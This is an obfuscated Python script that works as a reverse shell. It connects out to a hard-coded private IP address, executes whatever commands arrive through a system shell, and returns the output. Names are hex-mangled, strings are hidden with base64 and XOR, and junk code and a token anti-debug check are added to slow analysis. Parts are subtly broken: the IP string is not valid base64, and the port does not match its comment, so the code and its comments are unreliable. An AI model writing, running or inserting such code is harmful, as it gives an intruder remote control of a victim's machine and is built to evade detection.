import sys as _0x1
import time as _0x2
import base64 as _0x3
import random as _0x4
from types import ModuleType as _0x5

def _0x6(_0x7): return ''.join(chr(ord(_0x8) ^ 0x5A) for _0x8 in _0x7)
def _0x9(_0xa): return _0x3.b64decode(_0xa).decode()
def _0xb(_0xc): return sum(ord(_0xd) for _0xd in _0xc) % 0x100
def _0xe(): return _0x4.randint(0, 1000) * _0x2.time() % 0xFFFF

_0xf = _0x9('c29ja2V0')  # socket
_0x10 = _0x9('c3VicHJvY2Vzcw==')  # subprocess
_0x11 = _0x6(_0x9('>DHLTKAFHLTKAFHLTKAFHL'))  # 192.168.247.128
_0x12 = _0xe() ^ int(_0x9('NDQz'), 16)  # 443
_0x13 = _0xb(_0x11) ^ 0x400  # 1024

_0x14 = __import__(_0xf)
_0x15 = __import__(_0x10)

def _0x16():
    _0x17 = _0x14.socket(_0x14.AF_INET, _0x14.SOCK_STREAM)
    _0x17.connect((_0x11, _0x12))
    return _0x17

def _0x18(_0x19):
    _0x1a = _0x6(_0x19.decode('utf-8')).strip()
    return _0x1a if len(_0x1a) > _0xb('x') else None

def _0x1b(_0x1c):
    _0x1d = _0x4.randint(1, 100)
    if _0x1d % 2: _ = [x * x for x in range(_0x1d % 10)]  # Junk code
    try:
        return _0x15.check_output(_0x1c, shell=True, stderr=_0x15.STDOUT)
    except _0x15.CalledProcessError as _0x1e:
        return _0x1e.output
    except:
        return _0x9('RXJyb3I6IGV4ZWN1dGlvbiBmYWlsZWQ=').encode()

def _0x1f():
    _0x20 = _0x2.time()
    if _0x20 < 0: return False  # Anti-debug (simplified)
    return True

_0x21 = _0x16()
while _0x1f():
    try:
        _0x22 = _0x21.recv(_0x13)
        if not _0x22:
            break
        _0x23 = _0x18(_0x22)
        if _0x23:
            _0x24 = _0x1b(_0x23)
            _0x21.send(_0x24)
        else:
            _0x21.send(_0x9('RXJyb3I6IGludmFsaWQgY29tbWFuZA==').encode())
        _0x2.sleep(_0x4.random() / 1000)  # Random delay
    except Exception as _0x25:
        _0x21.send(_0x6(_0x9('>HLTKAF')).encode() + f" {_0x25}".encode())
        break

_0x21.close()
